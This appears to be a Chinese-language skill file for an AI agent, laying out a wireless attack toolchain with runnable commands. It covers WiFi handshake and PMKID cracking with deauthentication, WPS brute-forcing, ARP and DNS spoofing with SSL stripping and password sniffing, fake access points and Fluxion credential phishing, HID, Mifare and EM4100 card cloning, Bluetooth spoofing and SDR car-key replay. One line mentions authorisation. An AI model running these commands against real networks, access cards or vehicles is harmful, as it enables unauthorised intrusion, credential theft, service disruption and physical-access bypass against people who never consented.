---
name: wireless-security
description: 无线安全 — WiFi破解、蓝牙攻击、RFID克隆、SDR
version: 1.0.0
author: Hermes Agent
license: MIT
metadata:
  hermes:
    tags: [wireless, wifi, bluetooth, rfid, sdr, aircrack, wpa, ble]
---

# 无线安全工具链

## 核心工具

| 工具 | 用途 |
|------|------|
| **Aircrack-ng** | WiFi破解套件 |
| **Wifite2** | 自动化WiFi攻击 |
| **hcxdumptool** | PMKID捕获 |
| **hcxpcapngtool** | 抓包转换 |
| **bettercap** | 网络攻击/中间人/BLE |
| **Kismet** | 无线嗅探/IDS |
| **Fluxion** | 社工WiFi钓鱼 |
| **mdk4** | WiFi拒绝服务 |
| **Fern WiFi Cracker** | GUI WiFi破解 |
| **rfidresearchgroup** | RFID工具 |
| **Proxmark3** | RFID/NFC读写/克隆 |
| **Ubertooth** | 蓝牙嗅探 |
| **GQRX/SDR#** | 软件定义无线电 |

---

## 1. Aircrack-ng — WiFi破解套件

### 安装
```bash
sudo apt install aircrack-ng
```

### 完整流程
```bash
# 1. 开启监听模式
airmon-ng start wlan0
# 杀掉干扰进程
airmon-ng check kill

# 2. 扫描WiFi
airodump-ng wlan0mon

# 3. 锁定目标
airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture
# -c 信道  -w 输出文件

# 4. 抓取握手包
# 方式A: 等待客户端连接
# 方式B: 强制客户端重连(deauth攻击)
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 00:11:22:33:44:55 wlan0mon
# -0 deauth次数  -a AP的MAC  -c 客户端MAC

# 5. 破解
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
# 或转为hashcat格式
aircrack-ng -j capture_hashcat capture-01.cap
hashcat -m 22000 -a 0 capture_hashcat.hc22000 wordlist.txt
```

### WPS攻击
```bash
# 扫描WPS
wash -i wlan0mon

# Pixie Dust攻击(离线)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1

# 暴力PIN
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

---

## 2. Wifite2 — 自动化WiFi攻击

### 安装
```bash
git clone https://github.com/derv82/wifite2.git
cd wifite2 && sudo python3 setup.py install
```

### 用法
```bash
sudo wifite2
# 自动扫描、选择目标、自动尝试所有攻击方式:
# WPS Pixie Dust -> WPS PIN -> PMKID -> 4-way handshake

# 指定接口
sudo wifite2 -i wlan0

# 只攻击WPA
sudo wifite2 --wpa

# 只攻击WPS
sudo wifite2 --wps

# 不杀进程
sudo wifite2 --kill
```

---

## 3. hcxdumptool — PMKID捕获

### 安装
```bash
sudo apt install hcxdumptool hcxpcapngtool
```

### 用法
```bash
# 捕获PMKID(不需要客户端)
sudo hcxdumptool -i wlan0mon --filterlist_ap=targets.txt --filtermode=2 -o capture.pcapng

# 转换为hashcat格式
hcxpcapngtool -o hash.hc22000 capture.pcapng

# 破解
hashcat -m 22000 -a 0 hash.hc22000 wordlist.txt
```

### PMKID vs 握手包
- PMKID: 不需要客户端在线，主动发probe请求
- 握手包: 需要客户端连接或deauth触发

---

## 4. bettercap — 网络攻击

### 安装
```bash
sudo apt install bettercap
# 或
go install github.com/bettercap/bettercap@latest
```

### ARP欺骗/MitM
```bash
sudo bettercap -iface wlan0

# 在bettercap shell中
>> net.probe on                # 发现主机
>> net.show                    # 显示主机
>> arp.spoof on                # ARP欺骗
>> set arp.spoof.targets 192.168.1.100
>> set arp.spoof.fullduplex true
>> arp.spoof on

# DNS欺骗
>> set dns.spoof.domains target.com
>> set dns.spoof.address 192.168.1.1
>> dns.spoof on

# HTTPS降级/SSL剥离
>> set http.proxy.sslstrip true
>> http.proxy on

# 抓取密码
>> set net.sniff.verbose true
>> net.sniff on
>> set http.proxy.script /path/to/dump_cookies.js
```

### WiFi攻击
```bash
# 扫描WiFi
>> wifi.recon on
>> wifi.show

# WiFi deauth
>> set wifi.deauth.targets AA:BB:CC:DD:EE:FF
>> wifi.deauth on

# 伪造AP
>> set wifi.ap.ssid "FreeWiFi"
>> set wifi.ap.channel 6
>> wifi.ap on
```

### BLE(蓝牙低功耗)
```bash
>> ble.recon on
>> ble.show
```

---

## 5. Proxmark3 — RFID/NFC

### 安装
```bash
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3 && make -j$(nproc)
sudo make install
```

### 常用命令
```bash
# 启动
proxmark3 /dev/ttyACM0

# 低频卡(125kHz)
lf search                  # 搜索低频卡
lf hid read                # 读取HID卡
lf hid clone -r 200400000  # 克隆HID卡
lf t55xx detect            # 检测T55xx芯片

# 高频卡(13.56MHz)
hf search                  # 搜索高频卡
hf mf rdbl -b 0 -k FFFFFFFFFFFF  # 读Mifare Classic
hf mf dump                 # 导出Mifare数据
hf mf autopwn              # 自动破解Mifare密钥
hf mf cload -f dump.bin    # 克隆到魔术卡

# EM4100(门禁卡)
lf em 410x reader
lf em 410x clone --id 1234567890
```

---

## 6. Ubertooth — 蓝牙嗅探

### 安装
```bash
sudo apt install ubertooth
git clone https://github.com/greatscottgadgets/ubertooth.git
cd ubertooth/host && mkdir build && cd build && cmake .. && make && sudo make install
```

### 用法
```bash
# 扫描蓝牙设备
ubertooth-btle -f

# 嗅探经典蓝牙
ubertooth-btbb

# 监听特定设备
ubertooth-btle -t AA:BB:CC:DD:EE:FF
```

---

## 7. 蓝牙攻击

### spooftooph — 蓝牙欺骗
```bash
sudo apt install spooftooph
spooftooph -i hci0 -n "Target Device" -a AA:BB:CC:DD:EE:FF
```

### Bluetooth Classic
```bash
# 扫描
hcitool scan
hcitool inq

# 服务发现
sdptool browse AA:BB:CC:DD:EE:FF

# OBEX推送(文件传输漏洞)
obexftp -b AA:BB:CC:DD:EE:FF -p file.txt

# L2CAP fuzzing
l2ping AA:BB:CC:DD:EE:FF -s 1024
```

---

## 8. SDR — 软件定义无线电

### 工具
```bash
sudo apt install gqrx-sdr rtl-sdr hackrf

# 扫描频率
gqrx                          # GUI频谱分析

# RTL-SDR接收
rtl_fm -f 433.92e6 -M am -s 48k | aplay -r 48k -f S16_LE

# HackRF发送/接收
hackrf_transfer -t signal.raw -f 433920000 -s 2000000 -a 1
hackrf_transfer -r capture.raw -f 433920000 -s 2000000

# 车钥匙重放
# 1. gqrx找到频率(315/433MHz)
# 2. GNU Radio录制信号
# 3. 分析信号结构
# 4. 重放
```

### 常见频率
```
315 MHz  — 汽车遥控(美国)
433 MHz  — 汽车遥控(欧洲/亚洲)、IoT
868 MHz  — 欧洲IoT
915 MHz  — 美国IoT
2.4 GHz  — WiFi/蓝牙
```

---

## 9. 钓鱼WiFi

### Fluxion — 社工WiFi
```bash
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion && sudo bash fluxion.sh
# 自动: 扫描 -> 选择目标 -> 创建同名AP -> 弹出认证页面 -> 抓取密码
```

### hostapd-mana
```bash
git clone https://github.com/sensepost/hostapd-mana.git
cd hostapd-mana && make -j$(nproc)

# 创建伪造AP
hostapd-mana fakeap.conf
```

---

## Pitfalls

1. **需要支持监听模式的网卡** — 大多数内置网卡不支持
2. **推荐网卡** — Alfa AWUS036ACH (AC1200)、Alfa AWUS036NHA
3. **airmon-ng check kill** — 必须先杀掉NetworkManager等干扰进程
4. **PMKID不是所有AP都有** — 老AP可能不支持
5. **Proxmark3固件要更新** — 老固件功能不全
6. **SDR需要天线匹配** — 不同频率用不同天线
7. **WiFi攻击在有些国家违法** — 只在授权范围内测试
8. **蓝牙范围有限** — 通常10米内
